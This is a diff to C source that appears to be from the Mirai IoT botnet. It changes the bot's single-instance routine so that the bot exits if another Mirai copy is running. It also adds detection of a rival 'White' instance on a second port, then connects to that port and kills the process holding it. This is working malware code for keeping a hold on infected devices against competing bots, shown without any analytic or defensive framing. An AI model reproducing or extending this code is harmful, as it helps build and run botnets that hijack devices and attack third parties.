@@ -441,13 +441,24 @@ static void ensure_single_instance(void)
         if (errno == EADDRNOTAVAIL && local_bind)
             local_bind = FALSE;
 #ifdef DEBUG
-        printf("[main] Another instance is already running (errno = %d)! Sending kill request...\r\n", errno);
+        printf("[main] Another Mirai is already running! Exitting...\r\n");
 #endif
+        exit(0);
+    }
 
+    errno = 0;
+    addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
+    if (bind(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
+    {
+        if (errno == EADDRNOTAVAIL && local_bind)
+            local_bind = FALSE;
+#ifdef DEBUG
+        printf("[main] White detected! Killing...\r\n");
+#endif
         // Reset addr just in case
         addr.sin_family = AF_INET;
         addr.sin_addr.s_addr = INADDR_ANY;
-        addr.sin_port = htons(SINGLE_INSTANCE_PORT);
+        addr.sin_port = htons(SINGLE_INSTANCE_PORT_WHITE);
 
         if (connect(fd_ctrl, (struct sockaddr *)&addr, sizeof (struct sockaddr_in)) == -1)
         {
@@ -458,7 +469,7 @@ static void ensure_single_instance(void)
         
         sleep(5);
         close(fd_ctrl);
-        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+        killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_WHITE));
         ensure_single_instance(); // Call again, so that we are now the control
     }
     else
@@ -469,7 +480,7 @@ static void ensure_single_instance(void)
             printf("[main] Failed to call listen() on fd_ctrl\n");
             close(fd_ctrl);
             sleep(5);
-            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT));
+            killer_kill_by_port(htons(SINGLE_INSTANCE_PORT_WHITE));
             ensure_single_instance();
 #endif
         }
